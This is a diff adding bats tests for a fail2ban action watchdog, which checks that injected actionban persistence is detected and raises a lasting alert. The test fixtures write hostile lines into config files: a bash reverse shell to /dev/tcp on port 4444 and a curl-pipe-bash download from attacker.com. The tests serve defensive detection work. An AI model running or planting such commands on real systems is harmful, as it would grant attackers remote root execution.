@@ -196,3 +196,37 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-fail2ban-action -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): fail2ban-action-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 ban-triggered root-exec persistence — attacker self-induces
+    # a ban from throwaway IP to fire planted action. Alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '[Definition]\nactionban = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"fail2ban_actions_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/fail2ban/action.d + /usr/share/fail2ban/action.d axes — injection in ANY → alert)" {
+    ACTD2="${TMP}/share-action.d"; mkdir -p "${ACTD2}"
+    seed_benign
+    DIRS_V="${ACTD} ${ACTD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Definition]\nactionban = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ACTD2}/evil.conf"
+    DIRS_V="${ACTD} ${ACTD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '[Definition]\nactionban = curl -s http://attacker.com/p | bash\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
